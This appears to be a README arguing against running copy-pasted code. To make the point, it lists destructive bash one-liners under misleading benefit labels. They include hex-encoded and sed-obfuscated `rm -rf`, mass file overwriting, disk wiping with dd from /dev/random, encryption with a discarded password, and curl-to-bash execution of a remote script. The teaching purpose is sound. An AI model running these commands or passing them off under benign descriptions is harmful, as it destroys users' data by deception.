# My one page argument for learning to code (examples exaplained)

## **_NEVER_** run code you don't understand

I often hear people call themselves 'Copy and paste' coders. And, while copying and pasting is a legitimate thing to do, it should not be your only way of doing things. A better method is to find code, see what is done and then recreate it, and at a bare minimal, copy it, but know exactly what it does. \
Here is my small example of code that has unintended results.


> "Running code you found on the internet is like chewing gum you found in the subway'.  

### Try these (IN A VIRTUAL MACHINE!)

#### Here are some bad descriptions to **bad** commands
Note: Most of these will error, unless spuressed with ```&> /dev/null``` but alot of damage can still be done before you can take action.

A. Greatly simplifies document syntax: \
Find all files and replace all content with astriks

``` bash
while read f; do sed -i "" 's:.:*:g' "$f"; done <<< "$(find ~/ -iname '*' -print)"
```

B. Frees up uneccesary space: \
Simply remove all files and folders

``` bash
du ~/ | grep -o '/.*' | xargs rm -rf --
```

C. Relinks your files to improve efficentcy: \
Replace all files with a link to the void (/dev/null)

``` bash
du ~/*/* | grep -o '/.*' | xargs -n 1 ln -sf /dev/null/
```

D. Moves files/folders to a volume with unlimited storage: \
Moves all content 3 levels deep the void (dev/null)

``` bash
for d in ~/*/*; do mv "$d/" /dev/null; done
```

E. Frees up all uneccesary space: \
7375646f20726d202d7266202f0a is a hex dump of ```sudo rm -rf /``` \
The command reverses the dump and runs the output

``` bash
command $(echo 7375646f20726d202d7266202f0a | xxd -p -r) &> /dev/null
```

F. Chew the gum you don't even know: \
This downloads code online and runs it without ever you reviewing or seeing it

``` bash
bash -c "$(curl -s https://raw.githubusercontent.com/thedzy/My-one-page-argument-for-learning-to-code/master/malicious_file.sh)"
```

G. Frees up uneccesary space: \
This transforms 'stream -draft ~/saved' into ```rm -rf ~/``` by removing all characters between a-e and s-z and then evaulates it

```bash
eval $(sed 's:[a-e,s-z]::g' <<< "stream -draft ~/saved")
```

H. Compress files and save space: \
Compresses all files 5 levels deep to a random zip file with a random password of 64 characters. It does not store the password.

```bash
zip --password "$(openssl rand -base64 64)"  --move  "$(openssl rand -hex 4)".zip  ~/*/*/*/*/*
```

I. Reduce your need of the external volumes: \
Copy the contents of /dev/random to each drive is /dev/

```bash
for d in /dev/disk*; do dd if=/dev/random of=$d &; done
```

J. Simply your files and your life: \
Finds all files and replaces the contents with nothing

```bash
find ~/ -type f -exec bash -c ':|tee {} &' \; 
```

K. Keep logs of files in the home folder utilising your current files
Replaces the contents of every files with the filename

```bash
find ~/-type f -exec awk 'FNR == 1{ print FILENAME > FILENAME } ' {}  \;
```

### Recommended testing evironment:

1. Create a virtual machine.
2. Open terminal and run the folowing command to copy some files to the desktop: \
```find / -iname "*.txt" | head -n 60 | xargs -n1 -J% cp % $HOME/Desktop/ ```
3. Snapshot your VM, cause you'll need it
4. Run the command
5. Restore
6. Rinse and repeat
